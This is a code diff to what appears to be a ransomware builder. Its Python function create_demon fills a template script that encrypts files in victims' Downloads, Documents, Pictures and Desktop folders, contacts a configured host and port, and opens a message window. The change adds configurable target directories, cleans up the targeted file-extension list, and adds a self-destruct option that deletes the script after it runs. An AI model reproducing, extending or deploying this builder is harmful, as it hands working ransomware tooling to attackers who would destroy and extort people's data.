@@ -1,6 +1,6 @@
 import platform
 
-def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext):
+def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext, dirs, destruct):
     demon = """#/usr/bin/env python3
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
@@ -50,12 +50,7 @@ def start_encrypt(p, key):
 '''
     c = 0
 
-    if platform == 'Windows':
-        dirs = ['Downloads', 'Documents', 'Pictures', 'Music', 'Onedrive', 'Desktop']
-    elif platform == 'Darwin':
-        dirs = ['Downloads', 'Documents', 'Downloads', 'Pictures', 'Music']
-    elif platform == 'Linux':
-        dirs = ['Downloads', 'Documents', 'Desktop', 'Pictures']
+    dirs = [<dirs>]
 
     try:
         for x in dirs:
@@ -164,11 +159,17 @@ class mainwindow(Tk):
     start_gui = """main = mainwindow()
         main.mainloop()"""
 
-    list = ''
-
+    ext_list = ''
     for line in ext.split('\n'):
-        list = list + "%s" % ("'." + line + "',\n")
-    demon = demon.replace('<ext>', list)
+        if not line == '':
+            ext_list = ext_list + "%s" % ("'." + line + "',\n")
+    demon = demon.replace('<ext>', ext_list)
+
+    dir_list = ''
+    for line in dirs.split('\n'):
+        if not line == '':
+            dir_list = dir_list + "%s" % ("'" + line + "',\n")
+    demon = demon.replace('<dirs>', dir_list)
 
     if destruct == 1:
         demon = demon.replace('<destruct>', 'os.remove(sys.argv[0])')
